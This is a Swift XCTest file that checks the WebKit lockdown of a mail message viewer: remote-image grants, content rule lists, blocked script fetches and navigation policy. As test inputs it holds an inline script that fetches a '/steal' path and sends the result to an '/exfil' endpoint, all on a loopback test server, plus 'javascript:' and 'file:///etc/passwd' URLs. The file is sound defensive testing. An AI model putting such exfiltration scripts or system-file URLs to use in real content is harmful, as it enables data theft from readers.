// WebKit lockdown tests (decision 0011, decision 0019). These bypass the
// sanitizer on purpose — the html below is loaded verbatim — so the test
// proves that the WebKit layers alone (JS off, content rule list, CSP)
// stop the network, independently of the sanitizer. The observer is a
// loopback server that records every request path it sees.

import XCTest
import WebKit

@testable import ViewerKit

final class LockdownTests: XCTestCase {
    /// The loopback host as it must appear in URLs and grant lists.
    private var loopback: String { "127.0.0.1" }

    private func makeCore(opened: @escaping @Sendable (URL) -> Void = { _ in }) -> MessageWebViewCore {
        MessageWebViewCore(
            configuration: .init(attachmentSource: .none, onOpenLink: opened)
        )
    }

    /// A remote image loads only when the person granted that host.
    func testRemoteImageBlockedWithoutGrant() throws {
        let server = try RecordingHTTPServer()
        defer { server.stop() }
        let core = makeCore()
        let html = MessageDocument.wrap(
            "<p>no grant</p><img src=\"http://\(loopback):\(server.port)/pixel-a\">",
            allowRemoteContent: false
        )
        let output = MessageDocument.Output(html: html, links: [], remoteResources: [], hadActiveContent: false, isPlainText: false)
        core.load(output, rowID: 1, allowRemoteHosts: [])
        let expectation = expectation(description: "dwell")
        DispatchQueue.main.asyncAfter(deadline: .now() + 2.5) { expectation.fulfill() }
        wait(for: [expectation], timeout: 8)
        XCTAssertTrue(server.requests.isEmpty, "web view fetched \(server.requests) without a grant")
    }

    /// With the grant, the granted host is reachable. WebKit's local-network
    /// protection stops loopback subresources from the message's own custom
    /// scheme, so the grant path is observed from an http origin served by
    /// the recording server itself: main frame and image share the granted
    /// host, the rule list's ignore-previous-rules rule opens it.
    func testGrantedHostLoadsForGrantedHost() throws {
        let server = try RecordingHTTPServer()
        defer { server.stop() }
        server.serve("/doc", body: "<p>grant</p><img src=\"/pixel-b\">")
        let core = makeCore()
        let url = URL(string: "http://\(loopback):\(server.port)/doc")!
        core.load(from: url, allowRemoteHosts: [loopback])
        var saw = false
        for _ in 0..<20 {
            let expectation = expectation(description: "poll")
            DispatchQueue.main.asyncAfter(deadline: .now() + 0.25) { expectation.fulfill() }
            wait(for: [expectation], timeout: 5)
            if server.requests.contains("/pixel-b") { saw = true; break }
        }
        XCTAssertTrue(saw, "granted host was never fetched; got \(server.requests)")
    }

    /// The rule list is the layer that decides, independent of CSP: a rule
    /// blocking one path stops exactly that subresource while the main
    /// frame (a non-matching path) loads. Raw WebKit here; the core's use
    /// of the same mechanism is covered by the other tests.
    func testRuleListBlocksMatchingSubresource() throws {
        let server = try RecordingHTTPServer()
        defer { server.stop() }
        server.serve("/doc-blocked", body: "<p>blocked img</p><img src=\"/blocked-pixel\">")
        let expectation = expectation(description: "done")
        let webViewConfiguration = WKWebViewConfiguration()
        webViewConfiguration.defaultWebpagePreferences.allowsContentJavaScript = false
        let webView = WKWebView(frame: NSRect(x: 0, y: 0, width: 100, height: 100), configuration: webViewConfiguration)
        webView.loadHTMLString("<p>warm</p>", baseURL: nil)
        let json = RuleListCache.json(allowHosts: [])
            .replacingOccurrences(
                of: "\"trigger\":{\"url-filter\":\"^http://\"}",
                with: "\"trigger\":{\"url-filter\":\"^https?://127\\\\.0\\\\.0\\\\.1:[0-9]+/blocked-\"}"
            )
        WKContentRuleListStore.default().compileContentRuleList(
            forIdentifier: "geist9-blocked-path", encodedContentRuleList: json
        ) { @Sendable list, error in
            XCTAssertNil(error)
            guard let list else { expectation.fulfill(); return }
            let docURL = URL(string: "http://\(self.loopback):\(server.port)/doc-blocked")!
            DispatchQueue.main.async {
                webView.configuration.userContentController.add(list)
                webView.load(URLRequest(url: docURL))
                DispatchQueue.main.asyncAfter(deadline: .now() + 2) { expectation.fulfill() }
            }
        }
        wait(for: [expectation], timeout: 10)
        XCTAssertTrue(server.requests.contains("/doc-blocked"), "main frame should load: \(server.requests)")
        XCTAssertFalse(
            server.requests.contains(where: { $0.contains("blocked-pixel") }),
            "rule list failed to block the matching subresource: \(server.requests)"
        )
    }

    /// Script-driven fetches never happen: no content JavaScript, no CSP
    /// connect source, and the rule list blocks the network.
    func testScriptFetchNeverHappens() throws {
        let server = try RecordingHTTPServer()
        defer { server.stop() }
        let core = makeCore()
        let html = MessageDocument.wrap(
            "<script>fetch('http://\(loopback):\(server.port)/steal').then(r=>r.text()).then(t=>fetch('http://\(loopback):\(server.port)/exfil?t='+t));new Image().src='http://\(loopback):\(server.port)/beacon';</script>",
            allowRemoteContent: true
        )
        let output = MessageDocument.Output(html: html, links: [], remoteResources: [], hadActiveContent: false, isPlainText: false)
        core.load(output, rowID: 4, allowRemoteHosts: [loopback])
        let expectation = expectation(description: "dwell")
        DispatchQueue.main.asyncAfter(deadline: .now() + 2.5) { expectation.fulfill() }
        wait(for: [expectation], timeout: 8)
        XCTAssertTrue(server.requests.isEmpty, "script ran and fetched \(server.requests)")
    }

    /// A document served from the attachment scheme namespace, with remote
    /// content granted, may not navigate away: the delegate cancels and
    /// reports the link. Verified here through the pure policy function.
    func testNavigationPolicy() {
        typealias Policy = MessageWebViewCore
        let external = URL(string: "https://example.example/page")!
        let mailto = URL(string: "mailto:bob@example.org")!
        let attachment = URL(string: "x-bc-mail://message/1/#note")!
        let script = URL(string: "javascript:alert(1)")!
        let file = URL(string: "file:///etc/passwd")!

        XCTAssertEqual(Policy.policy(forNavigationURL: external, type: .linkActivated, linkActivated: true), .open(external))
        XCTAssertEqual(Policy.policy(forNavigationURL: mailto, type: .linkActivated, linkActivated: true), .open(mailto))
        XCTAssertEqual(Policy.policy(forNavigationURL: attachment, type: .linkActivated, linkActivated: true), .allow)
        XCTAssertEqual(Policy.policy(forNavigationURL: script, type: .linkActivated, linkActivated: true), .cancel)
        XCTAssertEqual(Policy.policy(forNavigationURL: file, type: .linkActivated, linkActivated: true), .cancel)
        XCTAssertEqual(Policy.policy(forNavigationURL: external, type: .reload, linkActivated: false), .cancel)
        XCTAssertEqual(Policy.policy(forNavigationURL: nil, type: .linkActivated, linkActivated: true), .cancel)
    }

    /// The rule list JSON is well-formed enough to compile: block rules for
    /// every network scheme first, then one `ignore-previous-rules`
    /// whitelist rule per granted host (`if-domain` — there is no plain
    /// allow action, and WebKit's url-filter regexes cannot express host
    /// boundaries).
    func testRuleListJSONShape() throws {
        let json = RuleListCache.json(allowHosts: ["mail.example.example"])
        XCTAssertTrue(json.contains(#""if-domain":["mail.example.example","*.mail.example.example"]"#), json)
        XCTAssertTrue(json.contains(#""type":"ignore-previous-rules""#), json)
        XCTAssertFalse(json.contains(#""type":"allow""#), json)
        let blockCount = json.components(separatedBy: #""type":"block""#).count - 1
        XCTAssertEqual(blockCount, 5) // https, http, wss, ws, ftp
        // Whitelists come after the block rules: ignore-previous exempts
        // the load from everything before it.
        let allowRange = try XCTUnwrap(json.range(of: "ignore-previous-rules"))
        let firstBlock = try XCTUnwrap(json.range(of: #""type":"block""#))
        XCTAssertTrue(allowRange.lowerBound > firstBlock.lowerBound, json)
    }
}
